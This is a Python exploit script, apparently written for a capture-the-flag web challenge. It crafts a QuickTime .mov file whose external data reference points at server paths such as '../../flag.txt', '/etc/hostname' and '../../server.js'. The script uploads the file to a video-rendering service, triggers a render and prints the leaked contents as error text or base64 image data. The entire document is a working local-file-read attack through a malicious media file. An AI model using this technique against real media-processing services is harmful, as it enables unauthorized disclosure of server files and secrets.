#!/usr/bin/env python3
import io, json, struct, base64, urllib.request, urllib.error, http.cookiejar

BASE="https://d7eef812-5707-splice-c7f97.mystery-challenges.webverselabs-pro.com"
def sess():
    cj=http.cookiejar.CookieJar()
    o=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj)); o.addheaders=[("User-Agent","Mozilla/5.0")]; return o
def do(o,path,data=None,headers=None,method=None):
    r=urllib.request.Request(BASE+path,data=data,method=method)
    for k,v in (headers or {}).items(): r.add_header(k,v)
    try:
        resp=o.open(r,timeout=90); return resp.status,dict(resp.getheaders()),resp.read()
    except urllib.error.HTTPError as e: return e.code,dict(e.headers),e.read()
    except Exception as e: return -1,{},str(e).encode()
def upload(o,fn,content):
    bd="----x"; body=io.BytesIO()
    body.write((f"--{bd}\r\nContent-Disposition: form-data; name=\"clip\"; filename=\"{fn}\"\r\nContent-Type: video/quicktime\r\n\r\n").encode())
    body.write(content); body.write(f"\r\n--{bd}--\r\n".encode())
    return do(o,"/studio/upload",data=body.getvalue(),headers={"Content-Type":f"multipart/form-data; boundary={bd}"},method="POST")
def render(o,**kw):
    st,h,b=do(o,"/api/render",data=json.dumps(kw).encode(),headers={"Content-Type":"application/json"},method="POST")
    try: return json.loads(b)
    except: return b.decode('utf-8','replace')

def box(t,p): return struct.pack(">I",len(p)+8)+t+p
def fbox(t,ver,flags,p): return box(t, bytes([ver])+flags.to_bytes(3,"big")+p)
IDENT=struct.pack(">9i",0x10000,0,0,0,0x10000,0,0,0,0x40000000)

def make_mov(path, N=64, rate=8000):
    mvhd=fbox(b"mvhd",0,0, struct.pack(">II",0,0)+struct.pack(">II",rate,N)+struct.pack(">I",0x10000)+struct.pack(">H",0x100)+b"\0"*10+IDENT+b"\0"*24+struct.pack(">I",2))
    tkhd=fbox(b"tkhd",0,7, struct.pack(">II",0,0)+struct.pack(">I",1)+b"\0"*4+struct.pack(">I",N)+b"\0"*8+struct.pack(">HH",0,0)+struct.pack(">H",0x100)+b"\0\0"+IDENT+struct.pack(">II",0,0))
    mdhd=fbox(b"mdhd",0,0, struct.pack(">II",0,0)+struct.pack(">II",rate,N)+struct.pack(">HH",0x55c4,0))
    hdlr=fbox(b"hdlr",0,0, b"\0\0\0\0"+b"soun"+b"\0"*12+b"SoundHandler\0")
    smhd=fbox(b"smhd",0,0, struct.pack(">HH",0,0))
    loc=path.encode()+b"\0"
    url =fbox(b"url ",0,0, loc)              # flags=0 -> external, location=path
    dref=fbox(b"dref",0,0, struct.pack(">I",1)+url)
    dinf=box(b"dinf",dref)
    # AudioSampleEntry 'raw ' (u8 pcm)
    ase=struct.pack(">6xH",1)+struct.pack(">HHI",0,0,0)+struct.pack(">HHHH",1,8,0,0)+struct.pack(">I",rate<<16)
    stsd=fbox(b"stsd",0,0, struct.pack(">I",1)+box(b"raw ",ase))
    stts=fbox(b"stts",0,0, struct.pack(">I",1)+struct.pack(">II",N,1))
    stsc=fbox(b"stsc",0,0, struct.pack(">I",1)+struct.pack(">III",1,N,1))
    stsz=fbox(b"stsz",0,0, struct.pack(">II",1,N))
    stco=fbox(b"stco",0,0, struct.pack(">I",1)+struct.pack(">I",0))
    stbl=box(b"stbl",stsd+stts+stsc+stsz+stco)
    minf=box(b"minf",smhd+dinf+stbl)
    mdia=box(b"mdia",mdhd+hdlr+minf)
    trak=box(b"trak",tkhd+mdia)
    moov=box(b"moov",mvhd+trak)
    ftyp=box(b"ftyp",b"qt  "+struct.pack(">I",0x200)+b"qt  ")
    return ftyp+moov

for path in ["../../flag.txt","../../../../etc/hostname","/opt/app/flag.txt","/etc/hostname","../../server.js"]:
    o=sess(); do(o,"/studio")
    mov=make_mov(path, N=64)
    st,h,b=upload(o,"clip.mov",mov)
    j=render(o,slug="p",theme="midnight")
    ok=j.get("ok") if isinstance(j,dict) else None
    err=(j.get("errors") if isinstance(j,dict) else str(j)) or ""
    print(f"\n######## dref path={path!r} upload={st} ok={ok}")
    if err:
        s=err.find("Input #0"); 
        print(err[s: s+900] if s>=0 else err[-900:])
    elif ok:
        url=j["outputs"][0]["url"]
        st,h,png=do(o,url)
        print("POSTER bytes",len(png))
        print(f"B64_{path.replace('/','_')}_START")
        print(base64.b64encode(png).decode())
        print(f"B64_{path.replace('/','_')}_END")
print("\nDONE")
